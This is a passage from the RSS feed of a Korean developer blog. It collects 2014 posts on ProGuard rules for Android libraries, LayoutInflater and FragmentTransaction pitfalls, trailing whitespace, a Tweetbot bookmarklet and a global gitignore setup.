&lt;p&gt;다른 라이브러리 프로젝트를 가져다 사용하고 있을 경우, ProGuard 사용에 있어 주의해야 할 경우가 생긴다.&lt;/p&gt;

&lt;h3&gt;&lt;a id=&quot;actionbarsherlock&quot;&gt;&lt;/a&gt;ActionBarSherlock&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://actionbarsherlock.com&quot;&gt;ActionBarSherlock&lt;/a&gt;의 경우 ProGuard를 사용할 때, &lt;a href=&quot;http://actionbarsherlock.com/faq.html&quot;&gt;다음 규칙을 추가하라고 명시&lt;/a&gt;하고 있다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;-keep class android.support.v4.app.** { *; }
-keep interface android.support.v4.app.** { *; }
-keep class com.actionbarsherlock.** { *; }
-keep interface com.actionbarsherlock.** { *; }

-keepattributes *Annotation*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;a id=&quot;crashlytics&quot;&gt;&lt;/a&gt;Crashlytics&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.crashlytics.com&quot;&gt;Crashlytics&lt;/a&gt;는 이미 ProGuard를 사용한 라이브러리들을 다시 ProGuard가 검사할 필요 없게 해서 &lt;a href=&quot;http://www.crashlytics.com/blog/mastering-proguard-for-building-lightweight-android-code/&quot;&gt;빌드 시간을 줄이는 팁&lt;/a&gt;을 제공하고 있다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;-libraryjars libs
-keep class com.crashlytics.** { *; }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;http://developer.android.com/tools/support-library/&quot;&gt;Android Support Library&lt;/a&gt;는 이미 소스가 공개되어 있기 때문에 코드 난독화가 필요하지 않다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;-libraryjars libs
-keep class android.support.v4.app.** { *; }
-keep interface android.support.v4.app.** { *; }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ProGuard를 이용해 코드 난독화 작업을 거치게 되면, 소스 파일의 줄 번호가 바뀌게 되어 Crashlytics의 스택 트레이스에서 정보를 얻기 어려울 수 있다. &lt;a href=&quot;http://support.crashlytics.com/knowledgebase/articles/202926-android-studio-and-intellij-with-proguard&quot;&gt;소스 파일의 줄 번호 정보를 유지&lt;/a&gt;하려면 다음 문장을 추가한다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;-keepattributes SourceFile,LineNumberTable
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;다만 이 코드 때문에 난독화가 덜 되는 것 같다는 생각이 든다면, 파일 이름을 모두 &lt;code&gt;&amp;quot;SourceFile&amp;quot;&lt;/code&gt; 문자열로 &lt;a href=&quot;http://proguard.sourceforge.net/manual/examples.html#stacktrace&quot;&gt;바꿀 수도 있다&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;-renamesourcefileattribute SourceFile
-keepattributes SourceFile,LineNumberTable
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;a id=&quot;google-play-services-sdk&quot;&gt;&lt;/a&gt;Google Play Services SDK&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://developer.android.com/google/play-services/index.html&quot;&gt;Google Play Services SDK&lt;/a&gt; 또한 필요한 클래스가 사라지는 것을 방지하기 위한 &lt;a href=&quot;https://developer.android.com/google/play-services/setup.html#Proguard&quot;&gt;ProGuard 규칙&lt;/a&gt;을 제공하고 있다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;-keep class * extends java.util.ListResourceBundle {
    protected Object[][] getContents();
}

-keep public class com.google.android.gms.common.internal.safeparcel.SafeParcelable {
    public static final *** NULL;
}

-keepnames @com.google.android.gms.common.annotation.KeepName class *
-keepclassmembernames class * {
    @com.google.android.gms.common.annotation.KeepName *;
}

-keepnames class * implements android.os.Parcelable {
    public static final ** CREATOR;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;a id=&quot;see-also&quot;&gt;&lt;/a&gt;참고 목록&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://tools.android.com/tech-docs/new-build-system/user-guide&quot;&gt;Gradle Plugin User Guide&lt;/a&gt; by &lt;a href=&quot;http://tools.android.com&quot;&gt;Android Tools Project Site&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.crashlytics.com/blog/mastering-proguard-for-building-lightweight-android-code/&quot;&gt;Mastering ProGuard for Building Lightweight Android Code&lt;/a&gt; by &lt;a href=&quot;https://www.crashlytics.com&quot;&gt;Crashlytics&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://proguard.sourceforge.net/manual/index.html&quot;&gt;ProGuard Manual&lt;/a&gt; by &lt;a href=&quot;http://proguard.sourceforge.net&quot;&gt;ProGuard&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://novafactory.net/archives/2845&quot;&gt;Gradle - Progaurd 사용하기(proguard rule)&lt;/a&gt; by &lt;a href=&quot;https://plus.google.com/113131691466488717287&quot;&gt;Nova&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Thu, 15 May 2014 18:11:13 +0900</pubDate>
        <link>http://yous.be/2014/05/15/how-to-configure-proguard-using-gradle/</link>
        <guid isPermaLink="true">http://yous.be/2014/05/15/how-to-configure-proguard-using-gradle/</guid>
        
        
        <category>Android</category>
        
      </item>
    
      <item>
        
        <title>Layout Inflation as Intended &amp;rarr;</title>
        
        <description>&lt;p&gt;안드로이드 개발을 하다 보면 &lt;a href=&quot;http://developer.android.com/reference/android/view/LayoutInflater.html&quot;&gt;LayoutInflater&lt;/a&gt;의 &lt;a href=&quot;http://developer.android.com/reference/android/view/LayoutInflater.html#inflate(int,%20android.view.ViewGroup)&quot;&gt;inflate(int, ViewGroup)&lt;/a&gt;와 &lt;a href=&quot;http://developer.android.com/reference/android/view/LayoutInflater.html#inflate(int,%20android.view.ViewGroup,%20boolean)&quot;&gt;inflate(int, ViewGroup, boolean)&lt;/a&gt;는 꽤 익숙하다. 하지만 다음 두 줄의 코드가 어떻게 다른지 아는 사람은 그리 많지 않을 것 같다. 실제로 &lt;a href=&quot;http://tools.android.com/tips/lint&quot;&gt;Android Lint&lt;/a&gt;는 한쪽 코드는 피하도록 권하고 있다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;n&quot;&gt;inflater&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;inflate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;layout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;my_layout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;inflater&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;inflate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;layout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;my_layout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;http://www.doubleencore.com/author/daves/&quot;&gt;Dave Smith&lt;/a&gt;가 이 두 코드의 비교와 함께, &lt;a href=&quot;http://www.doubleencore.com/2013/05/layout-inflation-as-intended/&quot;&gt;바른 Layout Inflation 방법&lt;/a&gt;에 대해 설명한 글이 있어 소개한다.&lt;/p&gt;
</description>
        <pubDate>Mon, 12 May 2014 07:17:37 +0900</pubDate>
        <link>http://yous.be/2014/05/12/layout-inflation-as-intended/</link>
        <guid isPermaLink="true">http://yous.be/2014/05/12/layout-inflation-as-intended/</guid>
        
        
        <category>Android</category>
        
      </item>
    
      <item>
        
        <title>Fragment Transaction &amp;amp; Activity State Loss &amp;rarr;</title>
        
        <description>&lt;p&gt;&lt;a href=&quot;http://developer.android.com/reference/android/support/v4/app/FragmentTransaction.html&quot;&gt;FragmentTransaction&lt;/a&gt;을 &lt;a href=&quot;http://developer.android.com/reference/android/support/v4/app/FragmentTransaction.html#commit()&quot;&gt;commit()&lt;/a&gt; 했을 때 Activity의 &lt;a href=&quot;http://developer.android.com/reference/android/app/Activity.html#onSaveInstanceState(android.os.Bundle)&quot;&gt;onSaveInstanceState(Bundle)&lt;/a&gt;이 실행된 후라면 다음과 같은 에러 메시지를 보게 된다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;java.lang.IllegalStateException: Can not perform this action after onSaveInstanceState
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 문제의 원인이 무엇인지, 어떻게 이 Exception을 피할지, 그리고 &lt;a href=&quot;http://developer.android.com/reference/android/support/v4/app/FragmentTransaction.html#commitAllowingStateLoss()&quot;&gt;commitAllowingStateLoss()&lt;/a&gt;가 왜 마지막 수단이 되어야 하는지 잘 설명한 글이 있어 소개한다. &lt;a href=&quot;http://www.androiddesignpatterns.com/about/&quot;&gt;Alex Lockwood&lt;/a&gt;가 쓴 &lt;a href=&quot;http://www.androiddesignpatterns.com/2013/08/fragment-transaction-commit-state-loss.html&quot;&gt;Fragment Transaction과 Activity State Loss&lt;/a&gt;에 관한 글이다.&lt;/p&gt;
</description>
        <pubDate>Thu, 03 Apr 2014 00:03:50 +0900</pubDate>
        <link>http://yous.be/2014/04/03/fragment-transaction-and-activity-state-loss/</link>
        <guid isPermaLink="true">http://yous.be/2014/04/03/fragment-transaction-and-activity-state-loss/</guid>
        
        
        <category>Android</category>
        
      </item>
    
      <item>
        
        <title>Trailing whitespace is evil. Don&#39;t commit evil into your repo. &amp;rarr;</title>
        
        <description>&lt;p&gt;&lt;a href=&quot;http://codeimpossible.com/about.html&quot;&gt;Jared Barboza&lt;/a&gt;가 쓴 &lt;a href=&quot;http://codeimpossible.com/2012/04/02/Trailing-whitespace-is-evil-Don-t-commit-evil-into-your-repo-/&quot;&gt;줄 끝 공백에 관한 글&lt;/a&gt;이다.&lt;/p&gt;

&lt;!-- **Lately, I’ve beeen working on a lot of projects with different people/languages/editors, most of us were new git’ers and each project had a real problem with trailing whitespace.** --&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;난 최근에 다양한 사람/언어/편집기와 함께 많은 프로젝트를 진행해 왔다. 우리들 대부분은 Git 초보자였고, 각 프로젝트는 줄 끝 공백에 관한 문제가 있었다.&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;경력 있는 개발자로만 이루어진 팀이라고 해도 이런 문제는 발생하기 마련이다.&lt;/p&gt;

&lt;!-- Trailing whitespace issues can cause a lot of problems when they get into your repository. It leads to falsey diffs which claim lines have been changed when in fact the only thing that changed was spacing. --&gt;

&lt;blockquote&gt;
&lt;p&gt;줄 끝 공백은 당신의 저장소에서 상당히 많은 문제를 일으킬 수 있다. 실제로 바뀐 것은 공백일 뿐인데도 그 줄에 변경 사항이 있다는 잘못된 diff를 만든다.&lt;/p&gt;

&lt;!-- This can make finding what actually changed in a file later on in the development cycle next to impossible. Most open source project leads know this and a lot of them will reject pull requests that fail to trim whitespace (or have other --&gt;

&lt;p&gt;이는 개발 과정에서 나중에 실제 파일의 변경 사항이 무엇이었는지 찾기 불가능하게 만든다. 대부분의 오픈 소스 프로젝트 대표들은 이를 알고 있고, 그들 대부분은 줄 끝 공백을 없애지 않은 풀 리퀘스트를 거절할 것이다.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;이후 글에서는 Visual Studio와 Sublime Text 2에서 줄 끝 공백을 제거하는 방법과 git hook을 통해 커밋에 줄 끝 공백이 포함되지 않도록 하는 방법을 소개하고 있다.&lt;/p&gt;

&lt;p&gt;나는 Android Studio에서는 파일 저장 시 모든 줄 끝 공백을 지우고, Vim에서는 줄 끝 공백에 하이라이트를 입혀 쓰고 있다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-vim&quot; data-lang=&quot;vim&quot;&gt;highlight ExtraWhitespace ctermbg&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;red&lt;/span&gt; guibg&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;red&lt;/span&gt;
autocmd &lt;span class=&quot;nb&quot;&gt;BufWinEnter&lt;/span&gt; * &lt;span class=&quot;k&quot;&gt;match&lt;/span&gt; ExtraWhitespace &lt;span class=&quot;sr&quot;&gt;/\s\+$/&lt;/span&gt;
autocmd &lt;span class=&quot;nb&quot;&gt;InsertEnter&lt;/span&gt; * &lt;span class=&quot;k&quot;&gt;match&lt;/span&gt; ExtraWhitespace &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;
autocmd &lt;span class=&quot;nb&quot;&gt;InsertLeave&lt;/span&gt; * &lt;span class=&quot;k&quot;&gt;match&lt;/span&gt; ExtraWhitespace &lt;span class=&quot;sr&quot;&gt;/\s\+$/&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; version &lt;span class=&quot;p&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;702&lt;/span&gt;
  autocmd &lt;span class=&quot;nb&quot;&gt;BufWinLeave&lt;/span&gt; * &lt;span class=&quot;k&quot;&gt;call&lt;/span&gt; clearmatches&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        <pubDate>Mon, 31 Mar 2014 20:57:09 +0900</pubDate>
        <link>http://yous.be/2014/03/31/trailing-whitespace-is-evil-dont-commit-evil-into-your-repo/</link>
        <guid isPermaLink="true">http://yous.be/2014/03/31/trailing-whitespace-is-evil-dont-commit-evil-into-your-repo/</guid>
        
        
        <category>Git</category>
        
      </item>
    
      <item>
        
        <title>Twitter Link Bookmarklet &amp;rarr;</title>
        
        <description>&lt;p&gt;&lt;a href=&quot;http://davebradford.com/about/&quot;&gt;Dave Bradford&lt;/a&gt;의 트위터에 관한 팁 &lt;a href=&quot;http://davebradford.com/blog/twitter-profile-bookmarklet/&quot;&gt;Twitter Profile Bookmarklet&lt;/a&gt;을 봤다. 직접 써 보니 기능이 추가됐으면 더 좋을 것 같아 추가했다.&lt;/p&gt;

&lt;p&gt;일단, 원글에 있는 코드의 기능은 간단하다. 모바일 사파리를 통해 트위터 계정을 보다가 북마크 버튼을 한 번 누르면 &lt;a href=&quot;http://tapbots.com/software/tweetbot/&quot;&gt;Tweetbot&lt;/a&gt;에서 볼 수 있게 된다. 여기에 브라우저를 통해 &amp;lsquo;트윗&amp;#39;을 보고 있다면 Tweetbot으로 바로 그 트윗을 볼 수 있게 기능을 추가했다. OS X에서도 동일하게 작동한다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/status&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;(?:&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;es&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)?\/(\d&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tweetbotUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;tweetbotUrl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/https&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/\/(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;mobile&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.)?&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;twitter&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;tweetbot:///user_profile/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;tweetbotUrl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;tweetbot:///status/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tweetbotUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;원리는 간단하다. 현재 페이지 URL에 &lt;code&gt;status&lt;/code&gt;나 &lt;code&gt;statuses&lt;/code&gt;가 포함되어 있으면 트윗을 열고, 그렇지 않으면 계정을 보여 준다. 아래 코드를 북마크 해두고, 필요할 때 눌러주면 된다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;javascript:var%20url=document.URL;var%20match=url.match(/status(?:es)?%5C/(%5Cd+)/i);var%20tweetbotUrl;if(match==null)%7BtweetbotUrl=url.replace(/https?:%5C/%5C/(mobile%5C.)?twitter%5C.com%5C//i,%22tweetbot:///user_profile/%22)%7Delse%7BtweetbotUrl=%22tweetbot:///status/%22+match[1]%7Dwindow.location=tweetbotUrl;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;기기에 Tweetbot 2와 Tweetbot 3가 모두 깔려 있을 때 Tweetbot 2로 열리는 점은 아쉽다.&lt;/p&gt;

&lt;p&gt;via &lt;a href=&quot;http://yoonjiman.net/2014/03/25/twitter-profile-bookmarklet/&quot;&gt;Yoon Jiman&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 27 Mar 2014 10:18:57 +0900</pubDate>
        <link>http://yous.be/2014/03/27/twitter-link-bookmarklet/</link>
        <guid isPermaLink="true">http://yous.be/2014/03/27/twitter-link-bookmarklet/</guid>
        
        
        <category>iOS</category>
        
      </item>
    
      <item>
        
        <title>Global Git Ignore &amp;rarr;</title>
        
        <description>&lt;p&gt;&lt;a href=&quot;http://usevim.com&quot;&gt;usevim&lt;/a&gt;의 &lt;a href=&quot;http://twitter.com/#!/alex_young&quot;&gt;Alex Young&lt;/a&gt;이 쓴 &lt;a href=&quot;http://usevim.com/2013/10/04/gitglobal-ignore/&quot;&gt;global gitignore에 관한 글&lt;/a&gt;이다.&lt;/p&gt;

&lt;!-- For years I dumped this into my `.gitignore` files: `*.sw?`. Then I realised that some people don&#39;t use Vim, and therefore probably don&#39;t want to see my editor-specific `.gitignore` entries. Different editors handle swap and recovery files different ways, so it seems redundant to force these settings on everyone. --&gt;

&lt;blockquote&gt;
&lt;p&gt;나는 몇 년간 &lt;code&gt;.gitignore&lt;/code&gt;에 &lt;code&gt;*.sw?&lt;/code&gt;을 넣어 왔는데, Vim을 쓰지 않는 사람들은 특정 편집기를 위한 &lt;code&gt;.gitignore&lt;/code&gt; 항목을 보고 싶지 않아 할 수도 있다는 걸 깨달았다. 편집기들은 임시 파일과 복구 파일을 각자 다른 방식으로 관리하기 때문에 이 설정을 모두에게 강요하는 것은 과해 보인다.&lt;/p&gt;

&lt;!-- A better approach is to use a global option. Run `git config --global core.excludesfile ~/.gitignore`. Then you can add `*.sw?`, and perhaps `*~` as well. I like to add `.DS_Store` because Windows developers don&#39;t need to worry about that nonsense, and they should probably add `Thumbs.db`. --&gt;

&lt;p&gt;이것보단 global 옵션을 사용하는 것이 낫다. &lt;code&gt;git config --global core.excludesfile ~/.gitignore&lt;/code&gt;를 실행해라. 그러면 거기에 &lt;code&gt;*.sw?&lt;/code&gt;을, 어쩌면 &lt;code&gt;*~&lt;/code&gt;도 넣을 수 있다. 난 &lt;code&gt;.DS_Store&lt;/code&gt;를 추가할 텐데, Windows 개발자들은 여기 신경 쓸 필요가 없기 때문이다. 그리고 그들은 아마 &lt;code&gt;Thumbs.db&lt;/code&gt;를 추가해야 할 것이다.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        <pubDate>Tue, 25 Mar 2014 20:49:32 +0900</pubDate>
        <link>http://yous.be/2014/03/25/global-git-ignore/</link>
        <guid isPermaLink="true">http://yous.be/2014/03/25/global-git-ignore/</guid>
        
        
        <category>Git</category>
        
      </item>
    
  </channel>
</rss>
